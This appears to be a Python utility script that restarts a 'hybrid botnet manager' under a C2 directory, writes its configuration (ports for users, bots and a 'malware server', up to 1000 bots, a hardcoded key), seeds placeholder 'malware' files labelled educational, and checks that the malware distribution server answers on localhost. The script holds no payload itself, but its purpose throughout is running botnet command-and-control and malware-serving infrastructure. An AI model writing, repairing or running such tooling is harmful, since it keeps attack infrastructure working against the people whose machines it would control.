#!/usr/bin/env python3
"""
Script to fix and test malware server functionality
"""

import os
import sys
import json
import time
import subprocess
import requests

def kill_existing_manager():
    """Kill existing hybrid manager processes"""
    print("🔄 Stopping existing hybrid manager...")
    try:
        result = subprocess.run(['pkill', '-f', 'hybrid_botnet_manager'], capture_output=True)
        time.sleep(2)
        print("✅ Existing processes stopped")
    except Exception as e:
        print(f"⚠️  Error stopping processes: {e}")

def update_config():
    """Update configuration to ensure malware server is enabled"""
    print("⚙️  Updating configuration...")
    
    config_path = "/home/ubuntu/C2/bane/botnet_config.json"
    template_path = "/home/ubuntu/C2/bane/config_template.json"
    
    # Load template or create default config
    if os.path.exists(template_path):
        with open(template_path, 'r') as f:
            config = json.load(f)
    else:
        config = {
            "c2_host": "0.0.0.0",
            "c2_users_port": 22222,
            "c2_bots_port": 7777,
            "malware_port": 6666,
            "web_port": 5000,
            "max_users": 10,
            "max_bots": 1000,
            "encryption_key": "bane_botnet_2024",
            "log_level": "INFO"
        }
    
    # Ensure malware server is enabled
    config['enable_malware_server'] = True
    
    # Save updated config
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=2)
    
    print("✅ Configuration updated")
    return config

def start_manager_with_malware():
    """Start hybrid manager with focus on malware server"""
    print("🚀 Starting hybrid manager...")
    
    # Change to bane directory
    os.chdir("/home/ubuntu/C2/bane")
    
    # Start manager in background
    process = subprocess.Popen([
        'python3', 'hybrid_botnet_manager.py'
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    # Give it time to start
    time.sleep(5)
    
    return process

def test_malware_server(config):
    """Test if malware server is running"""
    print("🧪 Testing malware server...")
    
    port = config.get('malware_port', 6666)
    test_url = f"http://localhost:{port}/"
    
    try:
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200:
            print(f"✅ Malware server is running on port {port}")
            print(f"📄 Response: {response.text[:100]}...")
            return True
        else:
            print(f"❌ Server responded with status {response.status_code}")
            return False
    except requests.exceptions.ConnectionError:
        print(f"❌ Cannot connect to port {port} - server not running")
        return False
    except Exception as e:
        print(f"❌ Test failed: {e}")
        return False

def check_ports():
    """Check what ports are actually listening"""
    print("🔍 Checking listening ports...")
    
    try:
        result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        
        python_ports = []
        for line in lines:
            if 'python' in line and 'LISTEN' in line:
                parts = line.split()
                if len(parts) >= 4:
                    addr_port = parts[3]
                    if ':' in addr_port:
                        port = addr_port.split(':')[-1]
                        python_ports.append(port)
        
        print(f"🔌 Python processes listening on ports: {python_ports}")
        return python_ports
        
    except Exception as e:
        print(f"❌ Error checking ports: {e}")
        return []

def create_malware_files():
    """Create sample malware files for testing"""
    print("📁 Creating sample malware files...")
    
    malware_dir = "/home/ubuntu/C2/bane/malware"
    if not os.path.exists(malware_dir):
        os.makedirs(malware_dir)
    
    # Create sample files
    files = {
        "test_payload.txt": "This is a test payload for educational purposes only",
        "info.txt": "Educational malware distribution server\nFor research purposes only",
        "readme.md": "# Malware Samples\n\nThese files are for educational purposes only."
    }
    
    for filename, content in files.items():
        filepath = os.path.join(malware_dir, filename)
        with open(filepath, 'w') as f:
            f.write(content)
    
    print(f"✅ Created {len(files)} sample files in {malware_dir}")

def main():
    """Main fix function"""
    print("🔧 MALWARE SERVER FIX UTILITY")
    print("=" * 50)
    
    # Step 1: Kill existing processes
    kill_existing_manager()
    
    # Step 2: Update configuration
    config = update_config()
    
    # Step 3: Create sample files
    create_malware_files()
    
    # Step 4: Start manager
    process = start_manager_with_malware()
    
    # Step 5: Check what ports are listening
    ports = check_ports()
    
    # Step 6: Test malware server
    malware_working = test_malware_server(config)
    
    # Summary
    print("\n" + "=" * 50)
    print("📊 FIX RESULTS:")
    print(f"🔸 Manager Process: {'✅ Running' if process.poll() is None else '❌ Stopped'}")
    print(f"🔸 Listening Ports: {ports}")
    print(f"🔸 Malware Server: {'✅ Working' if malware_working else '❌ Not Working'}")
    
    if malware_working:
        print(f"\n🎉 SUCCESS! Malware server is now running on port {config['malware_port']}")
        print(f"🌐 Test URL: http://localhost:{config['malware_port']}/")
        print("\n💡 You can now access your malware distribution server!")
    else:
        print(f"\n❌ FAILED! Malware server is still not working")
        print("🔧 Try these troubleshooting steps:")
        print("  1. Check if Flask is properly installed")
        print("  2. Verify port 6666 is not in use")
        print("  3. Check firewall settings")
        print("  4. Review the manager logs")
    
    # Keep process running if successful
    if malware_working and process.poll() is None:
        print(f"\n⏳ Manager will continue running. Press Ctrl+C to stop.")
        try:
            process.wait()
        except KeyboardInterrupt:
            print("\n🛑 Stopping manager...")
            process.terminate()
            process.wait()
            print("✅ Manager stopped")

if __name__ == "__main__":
    main()
